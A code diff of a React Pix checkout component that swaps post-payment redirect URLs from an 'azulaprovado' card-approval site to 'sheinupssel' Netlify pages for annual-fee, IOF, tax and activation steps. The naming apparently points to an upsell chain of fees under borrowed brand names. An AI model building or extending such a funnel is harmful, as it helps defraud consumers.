@@ -120,13 +120,13 @@ const PixPayment = ({ pixData, loading, onGeneratePix, email, cpf, total, fullNa
         localStorage.removeItem("checkout_deadline_ts");
       } catch {}
       if (ids.some((id) => TAXA_ANUAL_PRODUCT_IDS.includes(id))) {
-        window.location.href = "https://azulaprovado.site/cartao-liberado/up3/";
+        window.location.href = "https://sheinupssel.netlify.app/banking";
       } else if (ids.some((id) => IOF_WARNING_PRODUCT_IDS.includes(id))) {
-        window.location.href = "https://azulaprovado.site/cartao-liberado/up3/";
+        window.location.href = "https://sheinupssel.netlify.app/up3";
       } else if (ids.some((id) => ATIVAR_CONTA_PRODUCT_IDS.includes(id))) {
-        window.location.href = "https://azulaprovado.site/cartao-liberado/imposto/";
+        window.location.href = "https://sheinupssel.netlify.app/imposto";
       } else {
-        window.location.href = "https://azulaprovado.site/cartao-liberado/ativacao/";
+        window.location.href = "https://sheinupssel.netlify.app/ativacao/";
       }
     };
 
@@ -269,13 +269,13 @@ const PixPayment = ({ pixData, loading, onGeneratePix, email, cpf, total, fullNa
       } catch {}
       const ids = (orderItems || []).map((i) => i.id);
       if (ids.some((id) => TAXA_ANUAL_PRODUCT_IDS.includes(id))) {
-        window.location.href = "https://azulaprovado.site/cartao-liberado/up3/";
+        window.location.href = "https://sheinupssel.netlify.app/banking";
       } else if (ids.some((id) => IOF_WARNING_PRODUCT_IDS.includes(id))) {
-        window.location.href = "https://azulaprovado.site/cartao-liberado/up3/";
+        window.location.href = "https://sheinupssel.netlify.app/up3";
       } else if (ids.some((id) => ATIVAR_CONTA_PRODUCT_IDS.includes(id))) {
-        window.location.href = "https://azulaprovado.site/cartao-liberado/imposto/";
+        window.location.href = "https://sheinupssel.netlify.app/imposto";
       } else {
-        window.location.href = "https://azulaprovado.site/cartao-liberado/ativacao/";
+        window.location.href = "https://sheinupssel.netlify.app/ativacao/";
       }
     }, 1500);
   }, [pixData, orderItems, total, email, phone, cpf, fullName, city, state, zipCode, navigate]);
